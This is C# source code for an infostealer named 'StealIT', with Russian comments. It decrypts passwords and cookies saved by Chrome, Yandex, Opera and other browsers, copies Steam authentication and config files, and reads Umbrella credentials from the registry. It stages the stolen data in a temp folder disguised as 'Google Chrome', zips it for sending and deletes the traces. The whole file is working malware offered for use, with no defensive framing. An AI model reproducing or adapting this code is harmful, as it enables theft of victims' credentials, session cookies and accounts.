using System;
using System.Text;
using System.IO;
using Microsoft.Win32;
using System.IO.Compression;
using System.Threading.Tasks;

namespace StealIT
{
    public class StealIT
    {
        static string LoggsFolder = Path.GetTempPath() + "StealLOGS";                                      //Итоговые логи
        static string Trash = Path.GetTempPath() + "Goоgle Chrome";                                        //Временная папка
        static string SteamFolder = Path.GetTempPath() + "StealLOGS\\Steam";                               //Логи стима               
        public static string ZipPath = Path.GetTempPath() + "StealLOGSSend.zip";                           //ZIP с логами
        static string[] SQList =
            {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kometa\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Torch\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"
            };                                                                       //Массив с путями к Login Data
        static string[] CookiesData =
    {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kometa\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Torch\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Comodo\\Dragon\\User Data\\Default\\Cookies"
            };                                                                  //Массив с путями к Cookies
        static string[] SQNames =
        {
            "Google_LoginData",
            "Yandex_LoginData",
            "Kometa_LoginData",
            "Amigo_LoginData",
            "Torch_LoginData",
            "Orbitum_LoginData",
            "Opera_LoginData"
        };                                                                      //Массив с названиями браузеров (wtf rofl)
        static string[] CookiesNames =
{
            "Google_Cookies",
            "Yandex_Cookies",
            "Kometa_Cookies",
            "Amigo_Cookies",
            "Torch_Cookies",
            "Orbitum_Cookies",
            "Opera_Cookies",
            "Comodo_Cookies"
        };

        static public void DecryptSQL(string DB /*Путь к SQL Файлу*/, string BrowserName)
        {
            if (!File.Exists(DB)) //Проверка наличия файла
            {
                return;
            }
            string SQLPath = string.Format(@"{0}\\{1}", Trash, BrowserName);
            if (File.Exists(SQLPath))
            {
                File.Delete(SQLPath);
            }
            File.Copy(DB, SQLPath);
            string ConnectionString = string.Format(@"Data Source = {0}", SQLPath);
            byte[] Entropy = null;
            string Description;

            SQL DT = new SQL(SQLPath);
            DT.ReadTable("Logins");

            using (StreamWriter SW = new StreamWriter(string.Format(@"{0}\\{1}.txt", LoggsFolder, BrowserName)))
            {
                for (int i = 0; i < DT.GetRowCount(); i++)
                {
                    string Site = DT.GetValue(i, 1).ToString();
                    string Login = DT.GetValue(i, 3).ToString();
                    string Password = new UTF8Encoding(true).GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(DT.GetValue(i, 5)), Entropy, out Description));
                    SW.WriteLine(@"Site    : {0}", Site);
                    SW.WriteLine(@"Login   : {0}", Login);
                    SW.WriteLine(@"Password: {0}", Password);
                    SW.WriteLine("——————————————————————————————————————");
                }
                SW.Close();
            }
        }                 //Расшифровка базы Site:Login:Pass

        static public void DecryptCookiesData(string Cookie /*Путь к Cookies Файлу*/, string CookiezName)
        {
            if (!File.Exists(Cookie)) //Чек файла
            {
                return;
            }
            string CookiePath = string.Format(@"{0}\\{1}", Trash, CookiezName); 
            if (File.Exists(CookiePath))
            {
                File.Delete(CookiePath);
            }
            File.Copy(Cookie, CookiePath);
            string ConnectionString = string.Format(@"Data Source = {0}", CookiePath);
            byte[] Entropy = null;
            string Description;

            SQL DT = new SQL(CookiePath);

            DT.ReadTable("Cookies");

            using (StreamWriter SWCookies = new StreamWriter(string.Format(@"{0}\\{1}.txt", LoggsFolder, CookiezName)))
            {
                for (int i = 0; i < DT.GetRowCount(); i++)
                {
                    string Host = DT.GetValue(i, 1).ToString();
                    string Name = DT.GetValue(i, 2).ToString();
                    string Path = DT.GetValue(i, 4).ToString();
                    string EU = DT.GetValue(i, 5).ToString();
                    string Secure = DT.GetValue(i, 6).ToString();
                    string Value = new UTF8Encoding(true).GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(DT.GetValue(i, 12)), Entropy, out Description));
                    string CookiesOut = string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", new object[] { Host, Path, Secure.ToUpper(), EU, Name, Value });
                    SWCookies.WriteLine(CookiesOut);
                }
                SWCookies.Close();
            }
        } //Расшифровка Печенек

        static public  void Steam()
        {
            try
            {
                string SteamPath = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
                if (SteamPath != String.Empty)
                {
                    new DirectoryInfo(SteamPath + "/config");
                    foreach (string SteamPath2 in Directory.GetFiles(SteamPath, "ssfn*"))
                    {
                        File.Copy(SteamPath2, String.Format(SteamFolder + "/" + Path.GetFileName(SteamPath2)));
                        foreach (FileInfo fileinfo in new DirectoryInfo(SteamPath + "/config").GetFiles())
                        {
                            fileinfo.CopyTo(String.Format(SteamFolder + "/" + fileinfo.Name), true);
                        }
                    }
                }
            }
            catch { }
        }

        static public void Umbrella()
        {
            try
            {
                string login = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Umbrella", "login", null);
                string password = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Umbrella", "password", null);
                if (login != null && password != null)
                {
                    if (File.Exists(Path.GetTempPath() + "StealLOGS\\Umbrella.txt"))
                        File.Delete(Path.GetTempPath() + "StealLOGS\\Umbrella.txt");
                    using (StreamWriter SW = new StreamWriter(Path.GetTempPath() + "StealLOGS\\Umbrella.txt"))
                    {
                        SW.WriteLine($"Login: {login} Pass: {password}");
                    }
                }
            }
            catch
            { }
        }


        public string GetZip()
        {
            try
            {
                Directory.CreateDirectory(LoggsFolder);
                Directory.CreateDirectory(SteamFolder);
                Directory.CreateDirectory(Trash);
            }
            catch { }

            Task.Run(() => Steam());
            Task.Run(() => Umbrella()).Wait();
            Task.Run(() =>
            {
                for (int i = 0; i < SQList.Length; i++)
                    try { DecryptSQL(SQList[i], SQNames[i]); } catch { }
            });
            Task.Run(() =>
            {
                for (int i = 0; i < CookiesData.Length; i++)
                    try { DecryptCookiesData(CookiesData[i], CookiesNames[i]); } catch { }
            }).Wait();
            
            Task.Run(() =>
            {
                if (File.Exists(ZipPath))
                {
                    File.Delete(ZipPath);
                }

                ZipFile.CreateFromDirectory(LoggsFolder, ZipPath);
            }).Wait();

            DeleteFolder(SteamFolder);
            DeleteFolder(LoggsFolder);

            return ZipPath;
        }


        static public void DeleteFolder(string path)
        {
            try
            {
                string[] dirfiles = Directory.GetFiles(path);
                for (int i = 0; i < dirfiles.Length; i++)
                    File.Delete(dirfiles[i]);
                Directory.Delete(path);
            }
            catch { }
        }
    }
}
